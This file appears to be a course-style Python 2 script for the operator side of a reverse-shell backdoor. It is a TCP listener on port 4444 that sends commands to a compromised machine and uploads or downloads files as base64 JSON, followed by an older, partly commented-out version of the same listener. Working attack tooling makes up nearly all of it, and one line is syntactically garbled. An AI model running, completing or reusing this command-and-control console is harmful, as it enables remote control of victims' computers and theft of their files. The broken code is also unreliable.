#!/usr/bin/env python
#needs debugging to work in python 3 - bytes-like object error issue

import base64, json, socket

class Listener:
    def __init__(self, listen_ip, listen_port): #constructor
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM = TCP connection
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((listen_ip, listen_port))
        listener.listen(0) #specify backlog - number of connections that can be queued before it resets
        print("[+] Listening for incoming connections on " + listen_ip + " port:" + str(listen_port))
        self.connection, address = listener.accept()
        print("[+] Connection established from: " + address[0] + ":" + str(listen_port))
        
    def execute_remotely(self, command, buffer_size):
        #self.connection.send(command) #this will return TypeError in python3; requires bytes-like object, not string
        self.reliable_send(command)
        
        if command[0] == "exit": #if first element of command list contains exit
            self.connection.close() #close out socket connection
            exit() #exit python program
            
        #return self.connection.recv(buffer_size) #receive result in specified-byte chunks
        return self.reliable_receive()
    
    def read_file(self, path):
        with open(path, "rb") as file: #rb - open file for reading as binary
            return base64.b64encode(file.read()) #use base-64 file encoding
            #to be able to handle non-text files (images etc)
    
    def reliable_receive(self):
        json_data = ""
        while True: #loop to execute until entire stream of data is received
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data) #attempt to unpack json converted TCP stream
            except ValueError: #ValueError unterminated string will be received if entire data set is not received
                continue
    
    def reliable_send(self, data):
        #seralise data being sent as json package in order to make sure
        #data arrives intact and pipe doesn't break
        json_data = json.dumps(data) #dumps - method to convert to json object
        self.connection.send(json_data)
        
    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ") #command is a string
            #.split converts it into a list with " " space as delimiter
            #so commands can be split from arguments
            #print(command)
            # example of what command list will look like:
            #["upload", "sample.txt", "whatever file contains"]
            #this will send a list to the target computer
            #containing these elements
            
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content) #need to append third list
                    #element in order to send file to remote computer;
                    #file_content is sent and then called by reverse_backdoor
                    #with command[2] item in list specifying file
                result = self.execute_remotely(command, buffer_size)

                if command[0] == "download" and [-] Error " not in result: #
                    result = self.write_file(command[1], result)
            except Exception: #catch any errors that may occur, probably not good practice
                result = "[-] Error during command execution."
                
            print(result)
            
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."
        
            
            
#listen_ip = raw_input("Enter IP Address to listen on: ")
#listen_port = int(raw_input("Enter port to listen on: "))
#buffer_size = int(raw_input("Enter buffer size (1024 default): "))
listen_ip = " "
listen_port = 4444
buffer_size = 1024

my_listener = Listener(listen_ip, listen_port)
my_listener.run()


#================================
#!/usr/bin/env python
#needs debugging to work in python 3 - bytes-like object error issue

#import socket

#listen_ip = raw_input("Enter IP Address to listen on: ")
#listen_port = int(raw_input("Enter port to listen on: "))
#buffer_size = int(raw_input("Enter buffer size (1024 default: "))

#listen_ip = input("Enter IP Address to listen on: ") - python3
#listen_port = int(input("Enter port to listen on: ")) - python3
#buffer_size = int(input("Enter buffer size (1024 default: ")) - python3

#listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) - SOCK_STREAM = TCP connection
#listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#setsockopt = method for setting socket options
#(level, attribute, value)
#this allows reuse of sockets, so they will persist through lost connection

listener.bind((listen_ip, listen_port))
listener.listen(0) #specify backlog - number of connections that can be queued before it resets
print("[+] Listening for incoming connections on " + listen_ip + " port:" + str(listen_port))
#print("[+] Listening for incoming connections on ", listen_ip, "Port:", listen_port) - python3
#listener.accept() - needed to allow connection on the specified IP and port

#listener.accept - the accept method of the socket method returns two values:
connection, address = listener.accept()
#first value - "connection" - socket object representing connection used to send or receive data
#second value - "addresss" - address bound to the connection

print("[+] Connection established from: " + address[0] + ":" + str(listen_port))
#print("[+] Connection established from", address[0], str(listen_port)) - python3

while True:
    command = raw_input(">> ")
    #command = input(">> ") - python3
    connection.send(command) #this will return TypeError in python3; requires bytes-like object, not string
    result = connection.recv(buffer_size) #receive result in specified-byte chunks
    print(result)
